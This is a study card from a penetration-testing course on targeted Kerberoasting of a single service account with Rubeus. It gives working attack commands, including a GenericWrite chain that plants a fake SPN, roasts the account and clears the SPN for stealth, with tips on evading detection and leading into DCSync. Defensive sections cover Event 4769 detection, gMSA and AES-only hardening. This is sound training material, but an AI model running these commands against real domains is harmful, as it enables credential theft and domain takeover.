name: Rubeus - Kerberoast Single User
description: Roasts one specific SPN account — used for targeted Kerberoasting (after setting a fake SPN via GenericWrite ACL abuse) or to quietly pick off a single high-value service account. Generates only one Event 4769 vs. one per SPN in bulk mode.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== TWO USE CASES FOR TARGETED KERBEROASTING ===

1. PICKING OFF A SPECIFIC HIGH-VALUE ACCOUNT
   You know sqlsvc is a Domain Admin with a likely-weak password.
   Roast just that one account to minimize Event 4769 logs:
   .\Rubeus.exe kerberoast /user:sqlsvc /nowrap

2. TARGETED KERBEROASTING VIA GENERICWRITE (ACL ABUSE CHAIN) ===
   If you have GenericWrite over an account (adunn), you can SET a fake SPN
   on that account, making it Kerberoastable even if it wasn't before:

   Step 1 — Set fake SPN on victim account:
     Set-DomainObject -Credential $Cred2 -Identity adunn
       -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

   Step 2 — Roast the now-kerberoastable account:
     .\Rubeus.exe kerberoast /user:adunn /nowrap

   Step 3 — Clean up (critical for stealth):
     Set-DomainObject -Credential $Cred2 -Identity adunn
       -Clear serviceprincipalname -Verbose

   This is the GenericWrite → Kerberoast → Crack chain that chains into DCSync
   if the target account (adunn) has DCSync rights.

=== WHY THIS CHAINS TO DCSYNC ===
If adunn has Replication-Get-Changes + Replication-Get-Changes-All rights on the
domain object (often via ACL inheritance), cracking adunn's password lets you
run secretsdump.py as adunn to dump the entire NTDS.dit.

defense.why_it_works: Rubeus kerberoast /user:<name> targets a single high-value SPN account, minimising ticket requests.
defense.prerequisites: A domain context on Windows and a chosen target SPN account.
defense.impact: A crackable TGS hash for one specific service account.
defense.detection: [MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition. A single targeted 4769 is quieter than a bulk roast but still RC4-flaggable.
defense.artifacts: A single 4769 request; the hash; Rubeus execution.
defense.prevention: Use 100+ character passwords or gMSA for service accounts; disable RC4 (force AES); audit and remove unused SPNs; deploy honeypot SPN accounts to catch roasting; Defender for Identity flags mass TGS requests.
defense.evasion: Targeting one account avoids the bulk-request signature; /rc4opsec forces a crackable RC4 ticket.
defense.misconfiguration: Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).
defense.vulnerable_config:
# Service account set up manually with a weak password + SPN
# Attacker can find these with:
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet

# Bad state — password set 4 years ago, RC4 permitted:
# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433
# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable

# Confirming RC4 is available:
Get-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes
# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)
defense.secure_config:
# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,
# auto-rotated by AD, no human ever knows the password
New-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \
    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'
Install-ADServiceAccount gmsa_sql

# Fix 2 — For legacy accounts that must keep SPNs:
# Set a 100+ character random password (AD max is 127 chars):
$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)
Set-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)

# Fix 3 — Disable RC4, require AES-only:
Set-ADUser svc_sql -KerberosEncryptionType AES128,AES256
# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)
